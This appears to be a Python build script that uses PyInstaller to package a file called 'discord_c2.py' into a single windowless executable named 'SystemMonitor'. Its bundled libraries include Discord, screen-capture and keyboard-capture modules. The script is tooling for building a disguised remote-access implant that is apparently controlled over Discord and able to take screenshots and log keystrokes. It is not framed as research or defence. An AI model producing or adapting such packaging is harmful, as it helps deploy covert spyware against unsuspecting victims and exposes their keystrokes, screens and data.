import PyInstaller.__main__

PyInstaller.__main__.run([
    'discord_c2.py',
    '--onefile',
    '--noconsole',
    '--name=SystemMonitor',
    '--hidden-import=discord',
    '--hidden-import=psutil',
    '--hidden-import=cryptography',
    '--hidden-import=requests',
    '--hidden-import=mss',
    '--hidden-import=pynput',
    '--clean'
])